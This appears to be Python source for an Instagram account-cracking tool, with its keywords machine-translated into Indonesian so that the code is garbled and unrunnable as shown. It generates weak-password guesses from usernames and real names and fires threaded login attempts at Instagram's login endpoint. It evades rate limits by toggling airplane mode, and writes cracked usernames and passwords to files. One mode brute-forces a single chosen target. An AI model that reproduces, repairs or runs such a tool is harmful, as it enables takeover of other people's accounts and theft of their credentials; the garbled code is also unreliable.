		c=input('%s# %sPilih %s> %s'%(P,O,M,K))
		jika c=='1':
			self.generateAPI(xnx,c)
		elif c=='2':
			self.generateAPI(xnx,c)
		elif c=='3':
			self.generateAPI(xnx,c)
		kalau tidak:
			self.passwordAPI(xnx)

	def generateAPI(self,user,o):
		cetak(f"""
{U}{til}{O} [ {U}pilih user-agent, silahkan coba satu²{O} ]

{U}{til}{P} 01 {O}User-Agent 1
{U}{til}{P} 02 {O}User-Agent 2
{U}{til}{P} 03 {O}User-Agent 3
		""")
		ua=input('%s# %sPilih %s> %s'%(P,O,M,K))
		jika ua=='1':
			uaAPI=User_Agent()
		elif ua=='2':
			uaAPI=user_agent()
		elif ua=='3':
			uaAPI=user_agentAPI()
		cetak(f"""
{U}{til}{O} akun {H}[OK] {O}tersimpan ke file {M}> {H}IG/OK-{day}.txt
{U}{til}{O} akun {M}[{K}CP{M}] {O}tersimpan ke file {M}> {K}IG/CP-{day}.txt
{U}!{O} setiap crack 1k ID, mainkan mode pesawat 3 detik
		""")
		dengan ThreadPoolExecutor(max_workers=30) sebagai shinkai:
			untuk saya di pengguna:
				mencoba:
					nama pengguna=i.split("|")[0]
					sandi=i.split("|")[1].lower()
					untuk w di password.split(" "):
						jika len(w)<3:
							melanjutkan
						kalau tidak:
							w=w.lebih rendah()
							jika o=="1":
								jika len(w)==3 atau len(w)==4 atau len(w)==5:
									sandi=[w+'123',w+'12345']
								kalau tidak:
									sandi=[w+'123',w+'12345']
							elif o=="2":
								jika len(w)==3 atau len(w)==4 atau len(w)==5:
									sandi=[w,w+'123',w+'12345']
								kalau tidak:
									sandi=[w,w+'123',w+'12345']
							elif o=="3":
								jika len(w)==3 atau len(w)==4 atau len(w)==5:
									sandi=[w,w+'123',w+'12345',w,password.lower()]
								kalau tidak:
									sandi=[w,w+'123',w+'12345',w,password.lower()]
							shinkai.submit(self.crackAPI,username,sandi,uaAPI)
				kecuali:
					lulus
		
		os.popen('play-audio data/selesai.mp3')
		keluar("\n%s√ selesai"%(H))

	def APIinfo(mandiri,pengguna):
		mencoba:
			x=s.get("https://www.instagram.com/%s/?__a=1"%(pengguna),header={"user-agent":USN})
			x_jason=x.json()["graphql"]["pengguna"]
			nama=x_jason["nama_lengkap"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		kecuali:
			lulus
		return nama,pengikut,mengikut,postingan

	def crackAPI(self,user,pas,uaAPI):
		loop global, sukses, pos pemeriksaan
		warna = pilihan acak([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;96m [crack] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s %s%s] '%(loop,len(internal),H,M,H,len(sukses),O,K,M,K,len(pos pemeriksaan),O)),
		sys.stdout.flush()
		mencoba:
			untuk pw pas:
				token=s.get('https://www.instagram.com/accounts/login/')
				tajuk = {
					'Host': 'www.instagram.com',
					'Agen-Pengguna': uaAPI,
					'Menerima': '/',
					'Bahasa Terima': 'id,en-US;q=0,7,en;q=0,3',
					'Accept-Encoding': 'gzip, deflate, br',
					'X-CSRFToken': token.cookies['csrftoken'],
					'X-Instagram-AJAX': '1d6caaf37cd2',
					'X-IG-App-ID': '936619743392459',
					'X-ASBD-ID': '437806',
					'X-IG-WWW-Klaim': '0',
					'Tipe-Konten': 'application/x-www-form-urlencoded',
					'X-Diminta-Dengan': 'XMLHttpRequest',
					'Panjang Konten': '347',
					'Asal': 'https://www.instagram.com',
					'Koneksi': 'keep-alive',
					'Perujuk': 'https://www.instagram.com/accounts/login/'
				}
				parameter={
                    "nama pengguna": pengguna,
					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
					"optIntoOneTap": Salah,
					"queryParams": {},
					"stopDeletionNonce": "",
					"trustedDeviceRecords": {}}
				x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param)
				x_jason=json.memuat(x.teks)
				jika "userId" di str(x_jason):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print(f"""\r{J}╔══[ {H}Berhasil                      
{J}║══[{H} Nama akun {M}> {H}{nama}
{J}║══[{H} Nama pengguna {M}> {H}{pengguna}
{J}║══[{H} Kata Sandi {M}> {H}{pw}
{J}║══[{H} Pengikut {M}> {H}{pengikut}
{J}╚══[{H} Mengikuti {M}> {H}{mengikut}
					""")
					os.popen("play-audio dapet.mp3")
					open(f"IG/OK-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					sukses.tambahkan(pengguna)
					merusak
				elif 'checkpoint_url' di str(x_jason):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print(f"""\r{J}╔══[ {K}Pos pemeriksaan                      
{J}║══[{K} Nama akun {M}> {K}{nama}
{J}║══[{K} Nama pengguna {M}> {K}{pengguna}
{J}║══[{K} Kata Sandi {M}> {K}{pw}
{J}║══[{K} Pengikut {M}> {K}{pengikut}
{J}╚══[{K} Mengikuti {M}> {K}{mengikut}
					""")
					os.popen("play-audio dapet.mp3")
					open(f"IG/CP-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					pos pemeriksaan.append(pengguna)
					merusak
				elif 'Harap tunggu beberapa menit sebelum mencoba lagi.' di str(x.teks):
					sys.stdout.write(f"\r{M} ! terkena spam, aktifkan mode pesawat ");sys.stdout.flush();sleep(10)
					self.crackAPI(user,pas,uaAPI)
				kalau tidak:
					melanjutkan
			lingkaran+=1
		kecuali:
			self.crackAPI(user,pas,uaAPI)

	def checkAPI(self,user,pw):
		mencoba:
			token=s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
			crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
			s.headers.update({
				'otoritas': 'www.instagram.com',
				'x-ig-www-claim': 'hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h',
				'x-instagram-ajax': '82a581bb9399',
				'jenis-konten': 'application/x-www-form-urlencoded',
				'menerima': '*/*',
				'agen-pengguna': agen_pengguna(),
				'x-requested-with': 'XMLHttpRequest',
				'x-csrftoken': crf_token,
				'x-ig-app-id': '936619743392459',
				'asal': 'https://www.instagram.com',
				'sec-fetch-site': 'asal-sama',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'kosong',
				'referer': 'https://www.instagram.com/',
				'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
			})
			parameter={
				"nama pengguna": pengguna,
				"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
				"optIntoOneTap": Salah,
				"queryParams": {},
				"stopDeletionNonce": "",
				"trustedDeviceRecords": {}
			}
			x=s.post("https://www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
			x_jason=json.memuat(x.teks)
			jika "userId" di x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				cetak(f"""\r   
{J}╔══[ {H}Berhasil                      
{J}║══[{H} Nama akun {M}> {H}{nama}
{J}║══[{H} Nama pengguna {M}> {H}{pengguna}
{J}║══[{H} Kata Sandi {M}> {H}{pw}
{J}║══[{H} Pengikut {M}> {H}{pengikut}
{J}║══[{H} Mengikuti {M}> {H}{mengikut}
{J}╚══[{H} kerja sama {M}> {H}{postingan}
				""")
				os.popen("play-audio dapet.mp3")
			elif 'checkpoint_url' di x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				cetak(f"""\r  
{J}╔══[ {K}Pos pemeriksaan                      
{J}║══[{K} Nama akun {M}> {K}{nama}
{J}║══[{K} Nama pengguna {M}> {K}{pengguna}
{J}║══[{K} Kata Sandi {M}> {K}{pw}
{J}║══[{K} Pengikut {M}> {K}{pengikut}
{J}║══[{K} Mengikuti {M}> {K}{mengikut}
{J}╚══[{K} produktivitas {M}> {K}{postingan}
				""")
			elif 'Silakan tunggu beberapa menit' di str(x.text):
				sys.stdout.write(f"\r{M} ! terkena spam, aktifkan mode pesawat ");sys.stdout.flush();sleep(10)
				self.checkAPI(pengguna,pw)
		kecuali:
			self.checkAPI(pengguna,pw)
			
perulangan = 1
def infohhh(username_dev, pass_dev, status):
	mencoba:
		global id_, pengikut, mengikuti, nama
		da = request.get("https://www.instagram.com/%s/?__a=1"%(user),headers={"user-agent":USN})
		data_us_dev = da.json()["graphql"]["pengguna"]
		nama = data_us_dev["nama_lengkap"].encode("utf-8")
		id_ = data_us_dev["id"]
		pengikut = data_us_dev["edge_followed_by"]["count"]
		mengikuti = data_us_dev["edge_follow"]["count"]
	kecuali permintaan.pengecualian.ConnectionError:
		jika status == "":
			exit("\n%s• Tidak ada koneksi internet \n"%(M))
		kalau tidak:
			print ("\r%s• %s : %s > %s \n"%(M,status,username_dev,pass_dev))
			lulus
	kecuali ValueError:
		jika status == "":
			exit("\n%s• IP anda terkena spam, mode pesawat 3 detik \n"%(M))
		kalau tidak:
			print ("\r%s• %s : %s > %s \n"%(M,status,username_dev,pass_dev))
			lulus
	kecuali:
		print ("\r%s• %s : %s > %s \n"%(M,status,username_dev,pass_dev))
		lulus
		
# TARGET PECAH
def crack_target():
	pw_none = ""
	status_tidak ada = ""
	daftar_kata = []
	daftar_kata_crack = []
	target_pengguna = input('\n%s%s %sNama pengguna target%s > %s'%(U,til,O,M,K))
	waktu.tidur(2)
	jalan ("%s%s%s Mohon tunggu ... "%(M,til,O))
	infohhh(target_pengguna, pw_none, status_none)
	nama_pecah = nama.pecah()
	angka = [123,1234,12345]
	daftar_kata.tambahkan(nama.ganti(" ", ""))
	daftar_kata.tambahkan(nama)
	untuk dev dalam angka:
		jika len(nama_pecah) >= 2:
			daftar_kata.tambahkan(nama.ganti(" ", "")+str(dev))
		jika len(nama_pecah) >= 1:
			untuk sub_dev di nama_pecah:
				daftar_kata.tambahkan(sub_dev)
				daftar_kata.tambahkan(sub_dev+str(dev))
		jika len(nama_pecah) >= 2:
			word_list.append(nama_pecah[0]+nama_pecah[1])
			untuk dev_ dalam angka:
				word_list.append(nama_pecah[0]+nama_pecah[1]+str(dev_))
			word_list.append(nama_pecah[1]+nama_pecah[0])
			untuk dev_ dalam angka:
				word_list.append(nama_pecah[1]+nama_pecah[0]+str(dev_))
	daftar_kata.tambahkan(target_pengguna)
	untuk iq di set(word_list):
		jika len(iq) >= 6:
			word_list_crack.append(iq)
	pw_tambahan = ["sayang", "iloveyou", "bismillah", "anjing", "bangsat", "bajingan", "rahasia", "katasandi", "password", "kontol", "123456", "12345678" , "123456789"]
	untuk f di pw_tambahan:
		word_list_crack.append(f)
	print ("%s%s%s berhasil membuat kata sandi "%(U,til,O));jeda(2)
	mencetak
	brute(user_target, word_list_crack)
	KELUAR()
	
def brute(email_dev, san_dev_):
	untuk san_dev_1 di san_dev_:
		mencoba:
			perulangan global
			san_dev = san_dev_1.lower()
			dengan request.Session() sebagai dev:
				pas = q[0]
				url_scrap = "https://www.instagram.com/"
				user_agentz_api = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
				headerz = {"User-Agent": user_agentz_api}
				data = dev.get(url_scrap+post_, headers=headerz).konten
				crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
				header = {"Terima": "*/*","Terima-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": " www.instagram.com","X-CSRFToken": crf_token,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","Pengguna -Agen": user_agentz,}
				param = {"username": email_dev,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}{}".format(random.randint(1000000000, 99999999999), san_dev,y),"optIntoOneTap": False, "queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}}
			cetak (P+" "+str(c)+"."+O+" kata sandi"+M+" > "+K+san_dev+" ")
			dengan request.Session() sebagai ses_dev:
				url = "https://www.instagram.com/accounts/login/ajax/"
				respon = ses_dev.post(url+post_+y, data=param, header=header)
				data_dev = json.loads(respons.konten)
				l = q.ganti(q, "")
				jika "checkpoint_url" di str(data_dev):
					print (f"""{J}╔══[ {K}Pos pemeriksaan                      
{J}║══[{K} Nama akun {M}> {K}{nama}
{J}║══[{K} Nama pengguna {M}> {K}{email_dev}
{J}║══[{K} Kata Sandi {M}> {K}{san_dev}
{J}║══[{K} Pengikut {M}> {K}{str(pengikut)}
{J}╚══[{K} Mengikuti {M}> {K}{str(mengikuti)}
					""")
					merusak
				elif "userId" di str(data_dev):
					print (f"""{J}╔══[ {H}Berhasil                      
{J}║══[{H} Nama akun {M}> {H}{nama}
{J}║══[{H} Nama pengguna {M}> {H}{email_dev}
{J}║══[{H} Kata Sandi {M}> {H}{san_dev}
{J}║══[{H} Pengikut {M}> {H}{str(pengikut)}
{J}╚══[{H} Mengikuti {M}> {H}{str(mengikuti)}
					""")
					merusak
				elif "Mohon tunggu" di str(data_dev):					
					print ("\r%s! Mode pesawatkan 2 detik "%(M))
					san_dev_split = san_dev.split()
					brute(email_dev, san_dev_split)
				kalau tidak:
					lulus
					pengulangan+=1
		kecuali permintaan.pengecualian.ConnectionError:
			san_dev_split = san_dev.split()
			brute(email_dev, san_dev_split)
		kecuali KeyboardInterupsi:
			exit("%s• Keluar...."%(M))
		kecuali:
			lulus
			
